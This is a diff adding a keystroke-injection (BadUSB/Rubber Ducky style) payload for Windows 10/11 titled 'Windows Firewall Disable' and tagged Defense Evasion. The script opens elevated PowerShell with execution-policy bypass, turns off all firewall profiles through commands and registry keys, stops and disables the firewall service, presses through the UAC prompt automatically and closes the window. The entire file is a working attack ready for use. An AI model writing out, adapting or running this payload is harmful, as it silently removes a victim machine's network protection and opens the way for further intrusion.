@@ -1,0 +1,22 @@
+REM ==========================================
+REM Title: Windows Firewall Disable
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Disables Windows Firewall for
+REM   all network profiles (Domain, Private,
+REM   Public) via elevated PowerShell.
+REM Category: Defense Evasion
+REM ==========================================
+REM Open Run dialog
+DELAY 1000
+GUI r
+DELAY 500
+REM Launch PowerShell as Administrator
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile -Name EnableFirewall -Value 0 -Force; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile -Name EnableFirewall -Value 0 -Force; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile -Name EnableFirewall -Value 0 -Force; Stop-Service -Name MpsSvc -Force; Set-Service -Name MpsSvc -StartupType Disabled; Write-Host Done\"'"
+ENTER
+DELAY 2000
+REM Accept UAC prompt
+ALT y
+DELAY 1500
+REM Close terminal window
+ALT F4
